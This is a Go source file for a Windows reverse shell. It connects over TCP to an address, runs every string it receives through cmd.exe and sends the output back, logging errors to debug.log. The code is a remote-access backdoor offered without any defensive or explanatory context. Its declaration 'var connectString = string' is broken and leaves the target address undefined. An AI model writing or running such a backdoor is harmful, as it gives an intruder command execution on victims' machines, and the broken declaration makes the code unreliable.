package main

import (
    "net"
    "os"
    "os/exec"
)

var connectString = string

func main() {
    f, _ := os.Create("debug.log")
    defer f.Close()

    conn, err := net.Dial("tcp", connectString)
    if err != nil {
        f.WriteString("Connection failed: " + err.Error())
        return
    }

    for {
        buf := make([]byte, 4096)
        n, err := conn.Read(buf)
        if err != nil || n == 0 {
            f.WriteString("Disconnected or error: " + err.Error())
            break
        }

        cmd := exec.Command("cmd.exe", "/C", string(buf[:n]))
        out, err := cmd.CombinedOutput()
        if err != nil {
            f.WriteString("Command error: " + err.Error() + "\n")
        }
        conn.Write(out)
    }
}

